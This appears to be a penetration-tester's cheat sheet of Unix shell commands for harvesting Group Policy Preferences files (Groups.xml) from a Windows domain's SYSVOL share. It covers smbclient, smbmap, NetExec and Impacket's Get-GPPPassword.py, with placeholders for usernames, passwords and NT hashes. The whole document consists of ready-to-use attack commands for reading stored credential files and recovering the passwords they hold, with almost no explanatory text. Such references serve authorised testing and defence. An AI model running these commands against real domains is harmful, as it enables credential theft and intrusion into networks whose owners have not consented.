# Unix Shell

## 01 - Samba Suite Utils

Authentication syntax.

```
$ smbclient -U "<username>%<password>" //<IP>/SYSVOL

$ smbclient -U "<username>" --password="<password>" //<IP>/SYSVOL
```

Retrieve XML files recursively.

```
smb: \> cd <domain_name>/Policies

smb: \> recurse on

smb: \> prompt off

smb: \> mget *.xml
```

## 02 - SMBMap

```
$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> -F "Groups.xml" --search-path "SYSVOL\"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> --download "SYSVOL\path\to\remote\Groups.xml"
```

## 03 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --spider SYSVOL --pattern Groups.xml

$ netexec smb -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file /path/to/remote/Groups.xml
```

## 04 - Impacket

```
$ Get-GPPPassword.py [<domain>/]<username>:"<password>"@<IP>

$ Get-GPPPassword.py [<domain>/]<username>@<IP> -hashes :<nt_hash>
```

---
## References

 - [VK9 Security: Exploiting GPP SYSVOL (Groups.xml)](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/)